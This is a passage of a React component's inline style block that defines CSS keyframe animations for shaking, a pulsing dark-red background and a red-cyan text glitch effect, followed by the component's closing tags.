        10% { transform: translate(-1px, -2px) rotate(-1deg); }
        20% { transform: translate(-3px, 0px) rotate(1deg); }
        30% { transform: translate(3px, 2px) rotate(0deg); }
        40% { transform: translate(1px, -1px) rotate(1deg); }
        50% { transform: translate(-1px, 2px) rotate(-1deg); }
        60% { transform: translate(-3px, 1px) rotate(0deg); }
        70% { transform: translate(3px, 1px) rotate(-1deg); }
        80% { transform: translate(-1px, -1px) rotate(1deg); }
        90% { transform: translate(1px, 2px) rotate(0deg); }
        100% { transform: translate(1px, -2px) rotate(-1deg); }
      }
      .animate-shake_violent { animation: shake 0.3s infinite; }

      @keyframes rumble {
        0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
        50% { background-color: rgba(127, 29, 29, 0.95); }
      }
      .animate-bg_rumble { animation: rumble 0.15s infinite; }

      @keyframes glitch {
        0% { text-shadow: 3px 0 red, -3px 0 cyan; transform: skewX(0deg); }
        20% { text-shadow: -3px 0 red, 3px 0 cyan; transform: skewX(2deg); }
        40% { text-shadow: 3px 3px red, -3px -3px cyan; transform: skewX(-2deg); }
        60% { text-shadow: -3px -3px red, 3px 3px cyan; transform: skewX(1deg); }
        80% { text-shadow: 3px -3px red, -3px 3px cyan; transform: skewX(-1deg); }
        100% { text-shadow: 3px 0 red, -3px 0 cyan; transform: skewX(0deg); }
      }
      .animate-glitch_extreme { animation: glitch 0.2s infinite; }
      `}</style>
    </div>
  )
          }
